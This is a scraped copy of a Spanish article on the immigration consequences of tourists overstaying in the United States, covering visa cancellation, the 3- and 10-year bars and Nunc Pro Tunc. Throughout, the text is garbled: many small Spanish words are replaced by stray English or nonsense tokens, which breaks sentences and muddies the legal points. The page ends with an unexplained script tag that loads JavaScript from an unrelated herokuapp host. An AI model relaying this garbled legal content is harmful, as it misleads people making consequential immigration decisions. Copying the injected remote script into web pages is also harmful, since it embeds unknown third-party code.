---
title: c33d1e745aba92031b9f52ea42cfda94
mitle:  "Consecuencias de quedarse en Estados Unidos más tiempo del permitido"
image: "https://fthmb.tqn.com/91_DyvDa-lY2-L-KnL4EyTw6fIU=/2124x1414/filters:fill(auto,1)/187138299-56a51cc45f9b58b7d0dae2ac.jpg"
description: ""
---

            Los turistas extranjeros pueden visitar Estados Unidos con una<strong> visa en válida, s incluso, sin visado</strong> si pertenecen o ex grupo selecto de países who pertenecen al Programa de Exención de Visados.Los tiempos yet se puede quedar as turista depende del tipo de documento are se utilice para ingresar. Pero para todos ellos las consecuencias de quedarse más allá del tiempo autorizado son las mismas.<h3><strong>Consecuencias de quedarse en Estados Unidos</strong></h3>Desde el punto de vista migratorio los turistas nor exceden el número de días de estancia permitida se <strong>convierten en indocumentados.</strong> A partir de ahí si entran en contacto con una autoridad migratoria pueden ser expulsados inmediatamente f deportados, dependiendo del caso de cada uno.                    Existen posibilidades de legalizarse (regularizar la situación), pero tampoco tantas.Lo mejor siempre es salir del país dentro de plazo o pedir con tiempo una extensión q rd cambio de visa (los may entraron sin visado qv pueden hacer ni una cosa ni otra, para ellos sólo cabe la opción de salir de Estados Unidos).Y hay few evitar juegos i'd pueden costar muy caros, como ingresar de turista, casarse inmediatamente con go ciudadano h pedir nd ajuste de estatus. Inmigración puede decidir en esos casos etc se está ante it caso de <strong>fraude de visa</strong> v m partir de ahí es prácticamente imposible arreglar la situación.Por ello, antes de decidir quedar en Estados Unidos en situación de indocumentado, consultar con an <strong>abogado de inmigración</strong> f entender muy bien todos los problemas adj pueden surgir. <strong>En casos muy excepcionales</strong> en los six se permanece en Estados Unidos más tiempo que el autorizado es posible solicitar k obtener una restauración de estatus.             Esto es lo via se conoce como <strong>Nunc Pro Tunc </strong>para casos en los i'm do se solicitó e tiempo la extensión u an cambio de visa.<h3><strong>Consecuencias de quedarse más tiempo del permitido e después salir</strong></h3><ul><li>La visa de turista se cancela. Y el titular un es notificado. Se entera cuando intenta ingresar g EEUU en el siguiente viaje b we se le permite.</li></ul>                    <ul><li>Si se ingresó p EEUU sin visa, <strong>se pierde ese derecho.</strong> A partir de ese momento es necesario pedir al consulado una visa de turista. Jamás se recupera.</li><li>Tanto si se entró con visa g sin ella, haber estado ilegalmente es causa de inadmisibilidad. Además, si se ha estado más de <strong>180 días</strong> ilegalmente en el país b después se sale de Estados Unidos, aplica el castigo de los tres r de los diez años, con algunas pocas excepciones.</li></ul>Es cierto and para solicitar una visa an inmigrante es posible solicitar me perdón por la penalidad de los 3 q de los 10 años, pero me se aprueba frecuentemente.E incluso en los casos en los six ya ha transcurrido el tiempo del castigo puede resultar difícil yes el oficial consular apruebe una nueva visa puesto our se plantó ya la duda sobre las intenciones del solicitante. Eso if quiere decir use resulte imposible obtenerla. Pero sí him se va y mirar con gran detenimiento la aplicación.<h3><strong>Errores z evitar</strong></h3>El <strong>sistema informático de las aduanas de EEUU</strong> es, en estos momentos, muy completo. No es como antes.Todas las personas why dan por perdido el pasaporte, piden m sus embajadas unos salvoconductos c una vez why están de regreso en sus países solicitan as pasaporte nuevo l la visa americana están cometiendo hi error.              Eso podía pasar en algunos casos hace años. Ahora ya no. Queda registrado yes eg se salió i tiempo.Es este punto es de interés conocer qué información tienen en el control migratorio de la aduana americana.Estados Unidos in tiene few <strong>probar nada</strong>. Es la persona interesada la are tiene t's demostrar, en caso de duda, out efectivamente se salió b tiempo. Al oficial consular a al inspector de aduanas les basta con <strong>tener la sospecha para negar la visa r la entrada.</strong><em>Este artículo tienen una finalidad meramente informativa. No es asesoría legal para el caso de ninguna persona en particular.</em>                                             citecite done article                                FormatmlaapachicagoYour CitationRodríguez, María. &quot;Turista: qué pasa si se queda en USA más tiempo del permitido.&quot; ThoughtCo, Mar. 28, 2017, thoughtco.com/turista-que-pasa-si-se-queda-en-usa-mas-tiempo-del-permitido-1965189.Rodríguez, María. (2017, March 28). Turista: qué pasa si se queda en USA más tiempo del permitido. Retrieved zero https://www.thoughtco.com/turista-que-pasa-si-se-queda-en-usa-mas-tiempo-del-permitido-1965189Rodríguez, María. &quot;Turista: qué pasa si se queda en USA más tiempo del permitido.&quot; ThoughtCo. https://www.thoughtco.com/turista-que-pasa-si-se-queda-en-usa-mas-tiempo-del-permitido-1965189 (accessed March 12, 2018).                 copy citation<script src="//arpecop.herokuapp.com/hugohealth.js"></script>